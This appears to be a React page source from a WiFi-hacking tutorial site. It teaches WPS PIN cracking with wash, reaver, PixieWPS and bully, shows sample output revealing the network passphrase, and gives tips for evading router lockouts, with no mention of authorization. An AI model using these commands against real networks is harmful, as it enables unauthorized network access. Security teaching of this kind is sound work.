import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';
import { Troubleshooting, TroubleItem } from '../../components/Troubleshooting';

export default function WithoutWordlist() {
  return (
    <div className="content-area">
      <div className="topic-header">
        <div className="topic-breadcrumb">WPA / WPA2 Cracking <span>/</span> Without Wordlist</div>
        <h1>Hacking WPA & WPA2 Without a Wordlist</h1>
        <p className="topic-desc">While WPA2 normally requires a wordlist attack, there's a way to bypass this if the router has WPS (WiFi Protected Setup) enabled.</p>
      </div>

      <div className="topic-section">
        <h2>What is WPS?</h2>
        <p>WPS (WiFi Protected Setup) is a feature that lets users connect to WiFi by pressing a button or entering an 8-digit PIN instead of the password. The PIN is vulnerable to brute-force attacks.</p>

        <Diagram title="WPS PIN Vulnerability">
{`  WPS PIN: 1234 5678
           ──── ────
            │     │
            │     └── Second half (3 digits + 1 checksum = only 1,000 combos)
            │
            └──────── First half (4 digits = 10,000 combinations)
  
  Total combinations: 10,000 + 1,000 = 11,000  (NOT 100,000,000!)
  
  At ~1 attempt per second:
  Worst case: 11,000 seconds ≈ 3 hours
  Average: ~5,500 seconds ≈ 1.5 hours`}
        </Diagram>
      </div>

      <div className="topic-section">
        <h2>Check if WPS is Enabled</h2>
        <Terminal title="Scan for WPS" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo wash ' }, { type: 'flag', text: '-i ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: 'BSSID               Channel  RSSI  WPS Version  WPS Locked  ESSID' }],
          [{ type: 'output', text: 'AA:BB:CC:DD:EE:FF   6        -42   1.0          ' }, { type: 'highlight', text: 'No' }, { type: 'output', text: '          HomeRouter' }],
          [{ type: 'output', text: '11:22:33:44:55:66   1        -65   1.0          Yes         OtherNet' }],
          [{ type: 'comment', text: '# Look for WPS Locked: No  ← These are vulnerable' }],
        ]} />

        <InfoBox type="note">
          <p><strong>WPS Locked: No</strong> means the router is vulnerable to WPS brute force. <strong>WPS Locked: Yes</strong> means the router has locked WPS after too many failed attempts (some can be bypassed).</p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Attack Using Reaver</h2>
        <Terminal title="Reaver WPS Brute Force" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo reaver ' }, { type: 'flag', text: '-i ' }, { type: 'string', text: 'wlan0mon ' }, { type: 'flag', text: '-b ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-vv' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: 'Reaver v1.6.6 WiFi Protected Setup Attack Tool' }],
          [{ type: 'output', text: '[+] Switching wlan0mon to channel 6' }],
          [{ type: 'output', text: '[+] Waiting for beacon from AA:BB:CC:DD:EE:FF' }],
          [{ type: 'output', text: '[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: HomeRouter)' }],
          [{ type: 'output', text: '[+] Trying pin "12345670"' }],
          [{ type: 'output', text: '[+] Trying pin "12345671"' }],
          [{ type: 'output', text: '...' }],
          [{ type: 'output', text: '[+] ' }, { type: 'highlight', text: 'WPS PIN: \'45329087\'' }],
          [{ type: 'output', text: '[+] ' }, { type: 'highlight', text: 'WPA PSK: \'MySecretPassword123\'' }],
          [{ type: 'output', text: '[+] AP SSID: \'HomeRouter\'' }],
        ]} />

        <h3>Useful Reaver Flags</h3>
        <table className="info-table">
          <thead>
            <tr><th>Flag</th><th>Purpose</th></tr>
          </thead>
          <tbody>
            <tr><td><code>-i wlan0mon</code></td><td>Interface in monitor mode</td></tr>
            <tr><td><code>-b BSSID</code></td><td>Target access point</td></tr>
            <tr><td><code>-vv</code></td><td>Very verbose output</td></tr>
            <tr><td><code>-d 2</code></td><td>Delay between attempts (seconds)</td></tr>
            <tr><td><code>-K</code></td><td>Use PixieWPS attack (offline, much faster)</td></tr>
            <tr><td><code>--no-nacks</code></td><td>Don't send NACK messages</td></tr>
          </tbody>
        </table>
      </div>

      <div className="topic-section">
        <h2>PixieWPS Attack (Offline & Fast)</h2>
        <p>Some routers have a weak random number generator for WPS. PixieWPS exploits this to crack the PIN in seconds offline.</p>

        <Terminal title="PixieWPS with Reaver" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo reaver ' }, { type: 'flag', text: '-i ' }, { type: 'string', text: 'wlan0mon ' }, { type: 'flag', text: '-b ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-vv -K' }],
          [{ type: 'output', text: '[+] Trying pin "12345670"' }],
          [{ type: 'output', text: '[+] Running pixiewps...' }],
          [{ type: 'output', text: '[Pixie-Dust]  ' }, { type: 'highlight', text: 'PIN FOUND: 45329087' }],
          [{ type: 'output', text: '[+] WPA PSK: \'MySecretPassword123\'' }],
        ]} />

        <InfoBox type="tip">
          <p>Always try PixieWPS (<code className="inline-code">-K</code> flag) first. If it works, you get the password in seconds. If it fails, fall back to regular brute force.</p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Using Bully (Alternative to Reaver)</h2>
        <Terminal title="Bully WPS Attack" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo bully ' }, { type: 'string', text: 'wlan0mon ' }, { type: 'flag', text: '-b ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-v 3' }],
        ]} />
      </div>

      <Troubleshooting>
        <TroubleItem issue="WPS Locked: Yes — router locked WPS">
          <div className="solution">Solution:</div>
          <p>The router detected brute force and locked WPS. Options:</p>
          <ul style={{ paddingLeft: 20, marginTop: 8 }}>
            <li>Wait 5-60 minutes for the lockout to expire, then retry with a longer delay: <code className="inline-code">reaver -d 60</code></li>
            <li>Try changing your MAC address and retrying</li>
            <li>Some routers permanently lock — move on to handshake capture method instead</li>
          </ul>
        </TroubleItem>
        <TroubleItem issue="'wash' shows no networks with WPS">
          <p>Most modern routers have WPS disabled by default. This attack only works on routers with WPS enabled. You'll need to use the handshake + wordlist method instead.</p>
        </TroubleItem>
        <TroubleItem issue="Reaver gets stuck in a loop">
          <div className="solution">Solution:</div>
          <p>Try adding delays and different flags:</p>
          <Terminal title="Reaver with delays" lines={[
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo reaver -i wlan0mon -b BSSID ' }, { type: 'flag', text: '-d 5 --no-nacks -vv' }],
          ]} />
        </TroubleItem>
        <TroubleItem issue="'reaver: command not found'">
          <Terminal title="Install Reaver" lines={[
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo apt install reaver' }],
          ]} />
        </TroubleItem>
      </Troubleshooting>
    </div>
  );
}
